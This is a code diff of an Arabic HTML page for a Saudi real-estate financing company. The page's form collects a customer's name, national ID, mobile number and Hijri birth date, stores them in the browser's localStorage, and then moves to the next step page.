@@ -1,39 +1,137 @@
-<!-- step2.html -->
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>بيانات العميل</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <title>إدخال البيانات</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     body {
       font-family: 'Tajawal', sans-serif;
       background-color: #f9f9f9;
-      padding: 20px;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    main {
+      flex: 1;
+      padding: 30px 20px;
       text-align: center;
     }
-    label {
-      display: block;
-      margin: 15px 0 5px;
-      font-weight: bold;
+    h1 {
+      color: #004d40;
+      margin-bottom: 20px;
     }
-    input, select, button {
-      padding: 10px;
+    input, select {
       width: 90%;
       max-width: 400px;
-      font-size: 18px;
-      margin-bottom: 15px;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      text-align: center;
     }
-    .error {
-      color: red;
+    button {
+      padding: 12px 30px;
+      font-size: 18px;
+      background-color: #004d40;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+    footer {
+      background: #eeeeee;
+      text-align: center;
+      padding: 20px 10px;
       font-size: 14px;
+      border-top: 2px solid #004d40;
+    }
+    .highlight {
+      color: red;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <h2>الرجاء إدخال البيانات التالية</h2>
 
-  <label>الاسم الكريم:</label>
-  <input type="text" id="name" required>
+<main>
+  <h1>مرحباً بك عميلنا الكريم</h1>
+  <p>نرجو تعبئة بياناتك بدقة</p>
 
-  <label>رقم الهوية (10 أرقام
+  <input type="text" id="clientName" placeholder="الاسم الكريم" required />
+
+  <input type="text" id="clientId" placeholder="رقم الهوية (10 أرقام)" maxlength="10" oninput="validateId(this)" />
+
+  <input type="text" id="clientMobile" placeholder="رقم الجوال (يبدا بـ 05)" maxlength="10" oninput="validateMobile(this)" />
+
+  <select id="clientBirth">
+    <option value="">اختر تاريخ الميلاد (هجري)</option>
+    <option>1410/07/01</option>
+    <option>1412/07/01</option>
+    <option>1415/07/01</option>
+    <option>1418/07/01</option>
+    <option>1420/07/01</option>
+    <option>1425/07/01</option>
+    <option>1430/07/01</option>
+    <option>1435/07/01</option>
+    <option>1440/07/01</option>
+    <option>1445/07/01</option>
+  </select>
+
+  <br />
+  <button onclick="saveData()">التالي</button>
+</main>
+
+<footer>
+  <p><strong>شركة سرعة تملك العقار والحلول التمويلية المتكاملة</strong></p>
+  <p class="highlight">هذا النظام محمي بموجب المادة التاسعة من نظام التعاملات الإلكترونية في المملكة العربية السعودية</p>
+  <p id="datetime"></p>
+</footer>
+
+<script>
+  function validateId(input) {
+    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 10);
+  }
+
+  function validateMobile(input) {
+    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 10);
+    if (!input.value.startsWith("05")) {
+      input.setCustomValidity("رقم الجوال يجب أن يبدأ بـ 05");
+    } else {
+      input.setCustomValidity("");
+    }
+  }
+
+  function saveData() {
+    const name = document.getElementById("clientName").value.trim();
+    const id = document.getElementById("clientId").value.trim();
+    const mobile = document.getElementById("clientMobile").value.trim();
+    const birth = document.getElementById("clientBirth").value;
+
+    if (name && id.length === 10 && mobile.length === 10 && mobile.startsWith("05") && birth) {
+      localStorage.setItem("clientName", name);
+      localStorage.setItem("clientId", id);
+      localStorage.setItem("clientMobile", mobile);
+      localStorage.setItem("clientBirth", birth);
+      window.location.href = "step3.html";
+    } else {
+      alert("يرجى تعبئة جميع الحقول بشكل صحيح.");
+    }
+  }
+
+  // عرض التاريخ والوقت
+  const now = new Date();
+  const formattedDateTime = now.getFullYear() + "/" +
+    String(now.getMonth() + 1).padStart(2, '0') + "/" +
+    String(now.getDate()).padStart(2, '0') + " - " +
+    String(now.getHours()).padStart(2, '0') + ":" +
+    String(now.getMinutes()).padStart(2, '0') + ":" +
+    String(now.getSeconds()).padStart(2, '0');
+  document.getElementById("datetime").textContent = "التاريخ والوقت: " + formattedDateTime;
+</script>
+
+</body>
+</html>
